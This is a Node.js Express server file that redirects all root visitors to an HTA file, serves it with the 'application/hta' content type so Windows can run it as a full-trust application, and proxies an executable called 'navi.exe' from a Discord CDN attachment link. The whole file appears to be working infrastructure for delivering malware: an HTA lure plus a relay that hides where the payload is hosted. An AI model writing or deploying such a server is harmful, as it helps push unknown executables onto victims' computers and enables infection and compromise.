const express = require('express');
const path = require('path');
const https = require('https');
const app = express();
const port = process.env.PORT || 3000;

// Serve index.hta at the root
app.get('/index.hta', (req, res) => {
  const filePath = path.join(__dirname, 'index.hta');
  console.log('Serving:', filePath);
  res.setHeader('Content-Type', 'application/hta');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.sendFile(filePath);
});

// Redirect root to /index.hta
app.get('/', (req, res) => {
  res.redirect('/index.hta');
});

// Proxy the EXE download
app.get('/fetch', (req, res) => {
  const url = 'https://cdn.discordapp.com/attachments/1530596353376387113/1530742385942859896/navi.exe?ex=6a66ae70&is=6a655cf0&hm=c3eb2729fc4b208f419cbb1469c95c7c51398a7c2e3e38a5fab4c1a66e2b37f9&';
  
  https.get(url, (proxyRes) => {
    res.setHeader('Content-Type', 'application/octet-stream');
    proxyRes.pipe(res);
  }).on('error', (err) => {
    console.error('Proxy error:', err.message);
    res.status(500).send('Download failed');
  });
});

app.listen(port, '0.0.0.0', () => {
  console.log(`Server running on port ${port}`);
});
